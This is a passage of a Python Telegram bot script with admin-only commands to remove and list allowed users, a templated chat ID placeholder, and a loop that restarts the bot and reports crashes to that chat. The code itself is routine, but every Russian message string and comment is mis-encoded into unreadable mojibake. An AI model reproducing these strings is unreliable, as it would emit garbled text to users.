        bot.reply_to(message, "üö´ –¢–æ–ª—å–∫–æ –≥–ª–∞–≤–Ω—ã–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ—Ç —É–¥–∞–ª—è—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.")
        return

    try:
        user_id = int(message.text.split()[1])
        if user_id in allowed_users and user_id != MAIN_ADMIN_ID:
            allowed_users.remove(user_id)
            bot.reply_to(message, f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —É–¥–∞–ª—ë–Ω.")
        else:
            bot.reply_to(message, "‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –Ω–µ–ª—å–∑—è —É–¥–∞–ª–∏—Ç—å –≥–ª–∞–≤–Ω–æ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.")
    except (IndexError, ValueError):
        bot.reply_to(message, "‚ùå –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `!deluser <id>`", parse_mode="Markdown")

# –ö–æ–º–∞–Ω–¥–∞ !listuser ‚Äî —Å–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
def list_users(message):
    if message.from_user.id != MAIN_ADMIN_ID:
        bot.reply_to(message, "üö´ –¢–æ–ª—å–∫–æ –≥–ª–∞–≤–Ω—ã–π –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ—Ç –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å —Å–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.")
        return

    if allowed_users:
        users_list = "\n".join(map(str, allowed_users))
        bot.reply_to(message, f"üìú **–°–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:**\n```\n{users_list}\n```", parse_mode="Markdown")
    else:
        bot.reply_to(message, "üìú –í —Å–ø–∏—Å–∫–µ –ø–æ–∫–∞ –Ω–∏–∫–æ–≥–æ –Ω–µ—Ç.")


CHAT_ID = "{TGID}"  # –£–∫–∞–∂–∏ ID —á–∞—Ç–∞, –∫—É–¥–∞ –±–æ—Ç –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è

def start_bot():
    while True:
        try:
            bot.polling(non_stop=True, timeout=30)
        except Exception as e:
            error_message = f"‚ùå Bot crashed: {e}"
            print(error_message)
            
            # –ü—ã—Ç–∞–µ–º—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –∫—Ä–∞—à–µ
            try:
                bot.send_message(CHAT_ID, error_message)
                bot.send_message(CHAT_ID, "‚úÖ Restarting bot...")
            except Exception as tg_error:
                print(f"‚ö† –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram: {tg_error}")
            
            time.sleep(5)  # –ñ–¥–µ–º 5 —Å–µ–∫—É–Ω–¥ –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–æ–º

if __name__ == "__main__":
    start_bot()


